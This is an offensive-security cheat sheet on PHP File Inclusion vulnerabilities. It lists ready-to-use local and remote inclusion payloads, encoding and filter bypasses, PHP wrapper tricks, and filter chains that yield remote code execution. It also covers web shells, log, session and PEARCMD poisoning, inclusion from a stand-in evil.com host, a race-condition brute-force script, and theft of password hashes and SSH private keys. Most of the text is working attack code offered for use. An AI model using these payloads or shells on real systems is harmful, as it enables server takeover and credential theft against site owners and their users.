# File Inclusion

> A File Inclusion Vulnerability refers to a type of security vulnerability in web applications, particularly prevalent in applications developed in PHP, where an attacker can include a file, usually exploiting a lack of proper input/output sanitization. This vulnerability can lead to a range of malicious activities, including code execution, data theft, and website defacement.

**File Inclusion Vulnerability** should be differentiated from **Path Traversal**. The Path Traversal vulnerability allows an attacker to access a file, usually exploiting a "reading" mechanism implemented in the target application, when the File Inclusion will lead to the execution of arbitrary code.

## Summary

- [File Inclusion](#file-inclusion)
  - [Summary](#summary)
  - [Tools](#tools)
  - [Local File Inclusion](#local-file-inclusion)
    - [Null byte](#null-byte)
    - [Double encoding](#double-encoding)
    - [UTF-8 encoding](#utf-8-encoding)
    - [Path and dot truncation](#path-and-dot-truncation)
    - [Filter bypass tricks](#filter-bypass-tricks)
  - [Remote File Inclusion](#remote-file-inclusion)
    - [Null byte](#null-byte-1)
    - [Double encoding](#double-encoding-1)
    - [Bypass allow_url_include](#bypass-allow_url_include)
  - [LFI / RFI using wrappers](#lfi--rfi-using-wrappers)
    - [Wrapper php://filter](#wrapper-phpfilter)
    - [Wrapper data://](#wrapper-data)
    - [Wrapper expect://](#wrapper-expect)
    - [Wrapper input://](#wrapper-input)
    - [Wrapper zip://](#wrapper-zip)
    - [Wrapper phar://](#wrapper-phar)
      - [PHAR archive structure](#phar-archive-structure)
      - [PHAR deserialization](#phar-deserialization)
    - [Wrapper convert.iconv:// and dechunk://](#wrapper-converticonv-and-dechunk)
  - [LFI to RCE via /proc/*/fd](#lfi-to-rce-via-procfd)
  - [LFI to RCE via /proc/self/environ](#lfi-to-rce-via-procselfenviron)
  - [LFI to RCE via iconv](#lfi-to-rce-via-iconv)
  - [LFI to RCE via upload](#lfi-to-rce-via-upload)
  - [LFI to RCE via upload (race)](#lfi-to-rce-via-upload-race)
  - [LFI to RCE via upload (FindFirstFile)](#lfi-to-rce-via-upload-findfirstfile)
  - [LFI to RCE via phpinfo()](#lfi-to-rce-via-phpinfo)
  - [LFI to RCE via controlled log file](#lfi-to-rce-via-controlled-log-file)
    - [RCE via SSH](#rce-via-ssh)
    - [RCE via Mail](#rce-via-mail)
    - [RCE via Apache logs](#rce-via-apache-logs)
  - [LFI to RCE via PHP sessions](#lfi-to-rce-via-php-sessions)
  - [LFI to RCE via PHP PEARCMD](#lfi-to-rce-via-php-pearcmd)
  - [LFI to RCE via credentials files](#lfi-to-rce-via-credentials-files)
  - [References](#references)

## Tools

* [Kadimus - https://github.com/P0cL4bs/Kadimus](https://github.com/P0cL4bs/Kadimus)
* [LFISuite - https://github.com/D35m0nd142/LFISuite](https://github.com/D35m0nd142/LFISuite)
* [fimap - https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)
* [panoptic - https://github.com/lightos/Panoptic](https://github.com/lightos/Panoptic)


## Local File Inclusion

Consider a PHP script that includes a file based on user input. If proper sanitization is not in place, an attacker could manipulate the `page` parameter to include local or remote files, leading to unauthorized access or code execution.

```php
<?php
$file = $_GET['page'];
include($file);
?>
```

In the following examples we include the `/etc/passwd` file, check the `Directory & Path Traversal` chapter for more interesting files.

```powershell
http://example.com/index.php?page=../../../etc/passwd
```

### Null byte

:warning: In versions of PHP below 5.3.4 we can terminate with null byte.

```powershell
http://example.com/index.php?page=../../../etc/passwd%00
```

### Double encoding

```powershell
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```

### UTF-8 encoding

```powershell
http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00
```

### Path and dot truncation

On most PHP installations a filename longer than `4096` bytes will be cut off so any excess chars will be thrown away.

```powershell
http://example.com/index.php?page=../../../etc/passwd............[ADD MORE]
http://example.com/index.php?page=../../../etc/passwd\.\.\.\.\.\.[ADD MORE]
http://example.com/index.php?page=../../../etc/passwd/./././././.[ADD MORE] 
http://example.com/index.php?page=../../../[ADD MORE]../../../../etc/passwd
```

### Filter bypass tricks

```powershell
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
```


## Remote File Inclusion

> Remote File Inclusion (RFI) is a type of vulnerability that occurs when an application includes a remote file, usually through user input, without properly validating or sanitizing the input.

Remote File Inclusion doesn't work anymore on a default configuration since `allow_url_include` is now disabled since PHP5.

```ini
allow_url_include = On
```


Most of the filter bypasses from LFI section can be reused for RFI.

```powershell
http://example.com/index.php?page=http://evil.com/shell.txt
```

### Null byte

```powershell
http://example.com/index.php?page=http://evil.com/shell.txt%00
```


### Double encoding

```powershell
http://example.com/index.php?page=http:%252f%252fevil.com%252fshell.txt
```


### Bypass allow_url_include

When `allow_url_include` and `allow_url_fopen` are set to `Off`. It is still possible to include a remote file on Windows box using the `smb` protocol.

1. Create a share open to everyone
2. Write a PHP code inside a file : `shell.php`
3. Include it `http://example.com/index.php?page=\\10.0.0.1\share\shell.php`


## LFI / RFI using wrappers

### Wrapper php://filter

The part "`php://filter`" is case insensitive

```powershell
http://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php
http://example.com/index.php?page=php://filter/convert.iconv.utf-8.utf-16/resource=index.php
http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
http://example.com/index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php
```

Wrappers can be chained with a compression wrapper for large files.

```powershell
http://example.com/index.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd
```

NOTE: Wrappers can be chained multiple times using `|` or `/`: 
- Multiple base64 decodes: `php://filter/convert.base64-decoder|convert.base64-decode|convert.base64-decode/resource=%s`
- deflate then `base64encode` (useful for limited character exfil): `php://filter/zlib.deflate/convert.base64-encode/resource=/var/www/html/index.php`

```powershell
./kadimus -u "http://example.com/index.php?page=vuln" -S -f "index.php%00" -O index.php --parameter page 
curl "http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php" | base64 -d > index.php
```

Also there is a way to turn the `php://filter` into a full RCE. 

* [synacktiv/php_filter_chain_generator](https://github.com/synacktiv/php_filter_chain_generator) - A CLI to generate PHP filters chain
  ```powershell
  $ python3 php_filter_chain_generator.py --chain '<?php phpinfo();?>'
  [+] The following gadget chain will generate the following code : <?php phpinfo();?> (base64 value: PD9waHAgcGhwaW5mbygpOz8+)
  php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.UCS-2.UTF8|convert.iconv.L6.UTF8|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp
  ```
* [LFI2RCE.py](./LFI2RCE.py) to generate a custom payload.
  ```powershell
  # vulnerable file: index.php
  # vulnerable parameter: file
  # executed command: id
  # executed PHP code: <?=`$_GET[0]`;;?>
  curl "127.0.0.1:8000/index.php?0=id&file=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=/etc/passwd"
  ```


### Wrapper data://

```powershell
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```

Fun fact: you can trigger an XSS and bypass the Chrome Auditor with : `http://example.com/index.php?page=data:application/x-httpd-php;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+`


### Wrapper expect://

```powershell
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```


### Wrapper input://

Specify your payload in the POST parameters, this can be done with a simple `curl` command.

```powershell
curl -X POST --data "<?php echo shell_exec('id'); ?>" "https://example.com/index.php?page=php://input%00" -k -v
```

Alternatively, Kadimus has a module to automate this attack.

```powershell
./kadimus -u "https://example.com/index.php?page=php://input%00"  -C '<?php echo shell_exec("id"); ?>' -T input
```

### Wrapper zip://

1. Create an evil payload: `echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;`
2. Zip the file
  ```python
  zip payload.zip payload.php;
  mv payload.zip shell.jpg;
  rm payload.php
  ```
3. Upload the archive and access the file using the wrappers: http://example.com/index.php?page=zip://shell.jpg%23payload.php


### Wrapper phar://

#### PHAR archive structure

PHAR files work like ZIP files, when you can use the `phar://` to access files stored inside them.

1. Create a phar archive containing a backdoor file: `php --define phar.readonly=0 archive.php`

  ```php
  <?php
    $phar = new Phar('archive.phar');
    $phar->startBuffering();
    $phar->addFromString('test.txt', '<?php phpinfo(); ?>');
    $phar->setStub('<?php __HALT_COMPILER(); ?>');
    $phar->stopBuffering();
  ?>
  ```

2. Use the `phar://` wrapper: `curl http://127.0.0.1:8001/?page=phar:///var/www/html/archive.phar/test.txt`


#### PHAR deserialization

:warning: This technique doesn't work on PHP 8+, the deserialization has been removed. 

If a file operation is now performed on our existing phar file via the `phar://` wrapper, then its serialized meta data is unserialized. This vulnerability occurs in the following functions, including file_exists: `include`, `file_get_contents`, `file_put_contents`, `copy`, `file_exists`, `is_executable`, `is_file`, `is_dir`, `is_link`, `is_writable`, `fileperms`, `fileinode`, `filesize`, `fileowner`, `filegroup`, `fileatime`, `filemtime`, `filectime`, `filetype`, `getimagesize`, `exif_read_data`, `stat`, `lstat`, `touch`, `md5_file`, etc.

This exploit requires at least one class with magic methods such as `__destruct()` or `__wakeup()`.
Let's take this `AnyClass` class as example, which execute the parameter data.

```php
class AnyClass {
	public $data = null;
	public function __construct($data) {
		$this->data = $data;
	}
	
	function __destruct() {
		system($this->data);
	}
}

...
echo file_exists($_GET['page']);
```

We can craft a phar archive containing a serialized object in its meta-data.

```php
// create new Phar
$phar = new Phar('deser.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

// add object of any class as meta data
class AnyClass {
	public $data = null;
	public function __construct($data) {
		$this->data = $data;
	}
	
	function __destruct() {
		system($this->data);
	}
}
$object = new AnyClass('whoami');
$phar->setMetadata($object);
$phar->stopBuffering();
```

Finally call the phar wrapper: `curl http://127.0.0.1:8001/?page=phar:///var/www/html/deser.phar`

NOTE: you can use the `$phar->setStub()` to add the magic bytes of JPG file: `\xff\xd8\xff`

```php
$phar->setStub("\xff\xd8\xff\n<?php __HALT_COMPILER(); ?>");
```


### Wrapper convert.iconv:// and dechunk://


#### Leak file content from error-based oracle

- `convert.iconv://`: convert input into another folder (`convert.iconv.utf-16le.utf-8`)
- `dechunk://`: if the string contains no newlines, it will wipe the entire string if and only if
the string starts with A-Fa-f0-9

The goal of this exploitation is to leak the content of a file, one character at a time, based on the [DownUnderCTF](https://github.com/DownUnderCTF/Challenges_2022_Public/blob/main/web/minimal-php/solve/solution.py) writeup.
 
**Requirements**:
- Backend must not use `file_exists` or `is_file`.
- Vulnerable parameter should be in a `POST` request. 
  - You can't leak more than 135 characters in a GET request due to the size limit

The exploit chain is based on PHP filters: `iconv` and `dechunk`:

1. Use the `iconv` filter with an encoding increasing the data size exponentially to trigger a memory error.
2. Use the `dechunk` filter to determine the first character of the file, based on the previous error.
3. Use the `iconv` filter again with encodings having different bytes ordering to swap remaining characters with the first one.


Exploit using [synacktiv/php_filter_chains_oracle_exploit](https://github.com/synacktiv/php_filter_chains_oracle_exploit), the script will use either the `HTTP status code: 500` or the time as an error-based oracle to determine the character.

```ps1
$ python3 filters_chain_oracle_exploit.py --target http://127.0.0.1 --file '/test' --parameter 0   
[*] The following URL is targeted : http://127.0.0.1
[*] The following local file is leaked : /test
[*] Running POST requests
[+] File /test leak is finished!
```

#### Leak file content inside a custom format output

* [ambionics/wrapwrap](https://github.com/ambionics/wrapwrap) - Generates a `php://filter` chain that adds a prefix and a suffix to the contents of a file.

To obtain the contents of some file, we would like to have: `{"message":"<file contents>"}`.

```ps1
./wrapwrap.py /etc/passwd 'PREFIX' 'SUFFIX' 1000
./wrapwrap.py /etc/passwd '{"message":"' '"}' 1000
./wrapwrap.py /etc/passwd '<root><name>' '</name></root>' 1000
```

This can be used against vulnerable code like the following.

```php
<?php
  $data = file_get_contents($_POST['url']);
  $data = json_decode($data);
  echo $data->message;
?>
```


## LFI to RCE via /proc/*/fd

1. Upload a lot of shells (for example : 100)
2. Include http://example.com/index.php?page=/proc/$PID/fd/$FD, with $PID = PID of the process (can be bruteforced) and $FD the filedescriptor (can be bruteforced too)


## LFI to RCE via /proc/self/environ

Like a log file, send the payload in the User-Agent, it will be reflected inside the /proc/self/environ file

```powershell
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```


## LFI to RCE via iconv

Use the iconv wrapper to trigger an OOB in the glibc (CVE-2024-2961), then use your LFI to read the memory regions from `/proc/self/maps` and to download the glibc binary. Finally you get the RCE by exploiting the `zend_mm_heap` structure to call a `free()` that have been remapped to `system` using `custom_heap._free`.


**Requirements**:

* PHP 7.0.0 (2015) to 8.3.7 (2024)
* GNU C Library (`glibc`) <=  2.39
* Access to `convert.iconv`, `zlib.inflate`, `dechunk` filters

**Exploit**:

* [ambionics/cnext-exploits](https://github.com/ambionics/cnext-exploits/tree/main)


## LFI to RCE via upload

If you can upload a file, just inject the shell payload in it (e.g : `<?php system($_GET['c']); ?>` ).

```powershell
http://example.com/index.php?page=path/to/uploaded/file.png
```

In order to keep the file readable it is best to inject into the metadata for the pictures/doc/pdf


## LFI to RCE via upload (race)

* Upload a file and trigger a self-inclusion.
* Repeat the upload a shitload of time to:
* increase our odds of winning the race
* increase our guessing odds
* Bruteforce the inclusion of /tmp/[0-9a-zA-Z]{6}
* Enjoy our shell.

```python
import itertools
import requests
import sys

print('[+] Trying to win the race')
f = {'file': open('shell.php', 'rb')}
for _ in range(4096 * 4096):
    requests.post('http://target.com/index.php?c=index.php', f)


print('[+] Bruteforcing the inclusion')
for fname in itertools.combinations(string.ascii_letters + string.digits, 6):
    url = 'http://target.com/index.php?c=/tmp/php' + fname
    r = requests.get(url)
    if 'load average' in r.text:  # <?php echo system('uptime');
        print('[+] We have got a shell: ' + url)
        sys.exit(0)

print('[x] Something went wrong, please try again')
```


## LFI to RCE via upload (FindFirstFile)

:warning: Only works on Windows

`FindFirstFile` allows using masks (`<<` as `*` and `>` as `?`) in LFI paths on Windows. A mask is essentially a search pattern that can include wildcard characters, allowing users or developers to search for files or directories based on partial names or types. In the context of FindFirstFile, masks are used to filter and match the names of files or directories.

* `*`/`<<` : Represents any sequence of characters.
* `?`/`>` : Represents any single character.

Upload a file, it should be stored in the temp folder `C:\Windows\Temp\` with a generated name like `php[A-F0-9]{4}.tmp`.
Then either bruteforce the 65536 filenames or use a wildcard character like: `http://site/vuln.php?inc=c:\windows\temp\php<<`


## LFI to RCE via phpinfo()

PHPinfo() displays the content of any variables such as **$_GET**, **$_POST** and **$_FILES**.

> By making multiple upload posts to the PHPInfo script, and carefully controlling the reads, it is possible to retrieve the name of the temporary file and make a request to the LFI script specifying the temporary file name.

Use the script [phpInfoLFI.py](https://www.insomniasec.com/downloads/publications/phpinfolfi.py)

Research from https://www.insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf


## LFI to RCE via controlled log file

Just append your PHP code into the log file by doing a request to the service (Apache, SSH..) and include the log file.

```powershell
http://example.com/index.php?page=/var/log/apache/access.log
http://example.com/index.php?page=/var/log/apache/error.log
http://example.com/index.php?page=/var/log/apache2/access.log
http://example.com/index.php?page=/var/log/apache2/error.log
http://example.com/index.php?page=/var/log/nginx/access.log
http://example.com/index.php?page=/var/log/nginx/error.log
http://example.com/index.php?page=/var/log/vsftpd.log
http://example.com/index.php?page=/var/log/sshd.log
http://example.com/index.php?page=/var/log/mail
http://example.com/index.php?page=/var/log/httpd/error_log
http://example.com/index.php?page=/usr/local/apache/log/error_log
http://example.com/index.php?page=/usr/local/apache2/log/error_log
```


### RCE via SSH

Try to ssh into the box with a PHP code as username `<?php system($_GET["cmd"]);?>`.

```powershell
ssh <?php system($_GET["cmd"]);?>@10.10.10.10
```

Then include the SSH log files inside the Web Application.

```powershell
http://example.com/index.php?page=/var/log/auth.log&cmd=id
```


### RCE via Mail

First send an email using the open SMTP then include the log file located at `http://example.com/index.php?page=/var/log/mail`.

```powershell
root@kali:~# telnet 10.10.10.10. 25
Trying 10.10.10.10....
Connected to 10.10.10.10..
Escape character is '^]'.
220 straylight ESMTP Postfix (Debian/GNU)
helo ok
250 straylight
mail from: mail@example.com
250 2.1.0 Ok
rcpt to: root
250 2.1.5 Ok
data
354 End data with <CR><LF>.<CR><LF>
subject: <?php echo system($_GET["cmd"]); ?>
data2
.
```

In some cases you can also send the email with the `mail` command line.

```powershell
mail -s "<?php system($_GET['cmd']);?>" www-data@10.10.10.10. < /dev/null
```


### RCE via Apache logs

Poison the User-Agent in access logs:

```
$ curl http://example.org/ -A "<?php system(\$_GET['cmd']);?>"
```

Note: The logs will escape double quotes so use single quotes for strings in the PHP payload.

Then request the logs via the LFI and execute your command.

```
$ curl http://example.org/test.php?page=/var/log/apache2/access.log&cmd=id
```


## LFI to RCE via PHP sessions

Check if the website use PHP Session (PHPSESSID)

```javascript
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```

In PHP these sessions are stored into /var/lib/php5/sess_[PHPSESSID] or /var/lib/php/sessions/sess_[PHPSESSID] files

```javascript
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```

Set the cookie to `<?php system('cat /etc/passwd');?>`

```powershell
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```

Use the LFI to include the PHP session file

```powershell
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27
```


## LFI to RCE via PHP PEARCMD

PEAR is a framework and distribution system for reusable PHP components. By default `pearcmd.php` is installed in every Docker PHP image from [hub.docker.com](https://hub.docker.com/_/php) in `/usr/local/lib/php/pearcmd.php`. 

The file `pearcmd.php` uses `$_SERVER['argv']` to get its arguments. The directive `register_argc_argv` must be set to `On` in PHP configuration (`php.ini`) for this attack to work.

```ini
register_argc_argv = On
```

There are this ways to exploit it.

* **Method 1**: config create
  ```ps1
  /vuln.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=eval($_GET['cmd'])?>+/tmp/exec.php
  /vuln.php?file=/tmp/exec.php&cmd=phpinfo();die();
  ```

* **Method 2**: man_dir
  ```ps1
  /vuln.php?file=/usr/local/lib/php/pearcmd.php&+-c+/tmp/exec.php+-d+man_dir=<?echo(system($_GET['c']));?>+-s+
  /vuln.php?file=/tmp/exec.php&c=id
  ```
  The created configuration file contains the webshell.
  ```php
  #PEAR_Config 0.9
  a:2:{s:10:"__channels";a:2:{s:12:"pecl.php.net";a:0:{}s:5:"__uri";a:0:{}}s:7:"man_dir";s:29:"<?echo(system($_GET['c']));?>";}
  ```

* **Method 3**: download (need external network connection).
  ```ps1
  /vuln.php?file=/usr/local/lib/php/pearcmd.php&+download+http://<ip>:<port>/exec.php
  /vuln.php?file=exec.php&c=id
  ```

* **Method 4**: install (need external network connection). Notice that `exec.php` locates at `/tmp/pear/download/exec.php`.
  ```ps1
  /vuln.php?file=/usr/local/lib/php/pearcmd.php&+install+http://<ip>:<port>/exec.php
  /vuln.php?file=/tmp/pear/download/exec.php&c=id
  ```


## LFI to RCE via credentials files

This method require high privileges inside the application in order to read the sensitive files.


### Windows version

First extract `sam` and `system` files.

```powershell
http://example.com/index.php?page=../../../../../../WINDOWS/repair/sam
http://example.com/index.php?page=../../../../../../WINDOWS/repair/system
```

Then extract hashes from these files `samdump2 SYSTEM SAM > hashes.txt`, and crack them with `hashcat/john` or replay them using the Pass The Hash technique.


### Linux version

First extract `/etc/shadow` files.

```powershell
http://example.com/index.php?page=../../../../../../etc/shadow
```

Then crack the hashes inside in order to login via SSH on the machine.

Another way to gain SSH access to a Linux machine through LFI is by reading the private key file, id_rsa.
If SSH is active check which user is being used `/proc/self/status` and `/etc/passwd` and try to access `/<HOME>/.ssh/id_rsa`.


## References

